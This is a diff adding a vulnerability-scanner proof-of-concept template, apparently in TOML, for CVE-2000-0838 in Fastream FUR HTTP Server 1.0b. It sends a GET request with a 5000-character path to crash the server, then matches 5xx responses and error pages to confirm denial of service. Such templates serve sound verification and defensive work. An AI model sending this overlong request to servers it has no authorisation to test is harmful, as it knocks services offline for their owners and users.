@@ -1,0 +1,56 @@
+[info]
+author = "ave"
+description = "Fastream FUR HTTP Server 1.0b 远程拒绝服务漏洞验证，通过发送超长 GET 请求导致服务器崩溃或拒绝服务"
+id = "POC-AVE-2000-0965"
+name = "CVE-2000-0838 PoC"
+severity = "medium"
+tags = ["ave-2000-0965"]
+vuln_id = [
+    "CVE-2000-0838",
+    "AVE-2000-0965",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{repeat('A', 5000)}}"
+protocol = "http"
+
+[poc.requests.body]
+content = ""
+type = "raw"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+status = [
+    500,
+    502,
+    503,
+    504,
+]
+type = "status"
+
+[[poc.requests.matchers]]
+expect = false
+part = "header"
+type = "word"
+words = [
+    "Server:",
+    "Fastream",
+]
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "Internal Server Error",
+    "Service Unavailable",
+    "Bad Gateway",
+    "Gateway Timeout",
+]
